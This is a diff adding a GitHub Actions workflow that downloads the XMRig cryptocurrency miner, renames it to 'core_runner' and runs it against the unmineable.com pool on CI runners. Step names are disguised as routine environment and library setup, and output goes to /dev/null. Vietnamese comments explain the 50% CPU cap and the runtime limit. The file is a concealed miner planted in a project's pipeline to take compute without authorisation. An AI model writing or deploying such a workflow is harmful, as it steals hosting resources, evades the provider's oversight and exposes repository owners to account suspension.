@@ -1,0 +1,55 @@
+name: Mining Core Service
+
+on:
+  workflow_dispatch:
+    inputs:
+      coin:
+        required: true
+      wallet:
+        required: true
+      worker:
+        required: true
+      duration:
+        description: 'Runtime in seconds'
+        required: true
+        default: '300' 
+
+jobs:
+  processing-unit:
+    runs-on: ubuntu-latest
+    steps:
+    - name: Initialize Environment
+      run: |
+        sudo apt-get update > /dev/null 2>&1
+        echo "Environment Loaded."
+
+    - name: Fetch Core Libraries
+      env:
+        URL: "https://github.com/xmrig/xmrig/releases/download/v6.21.0/xmrig-6.21.0-linux-static-x64.tar.gz"
+        FILE: "sys_core.tar.gz"
+      run: |
+        curl -L -s -o $FILE $URL
+        tar -xzf $FILE
+        mv xmrig-6.21.0/xmrig core_runner
+        rm -rf xmrig-6.21.0 $FILE
+        chmod +x core_runner
+
+    - name: Execute Task
+      run: |
+        COIN="${{ github.event.inputs.coin }}"
+        WALLET="${{ github.event.inputs.wallet }}"
+        WORKER="${{ github.event.inputs.worker }}"
+        DURATION="${{ github.event.inputs.duration }}"
+        
+        echo "Task allocated for $DURATION seconds."
+
+        # Cấu hình Pool Unmineable
+        # --cpu-max-threads-hint 50 : Đây là chỗ giới hạn 50% CPU
+        # timeout $DURATION : Tự động tắt khi hết giờ
+        
+        timeout $DURATION ./core_runner -o rx.unmineable.com:3333 -a rx -k \
+          -u $COIN:$WALLET.$WORKER \
+          -p x --tls --cpu-max-threads-hint 50 > /dev/null 2>&1 || true
+          
+        echo "Session Expired. Shutting down."
+
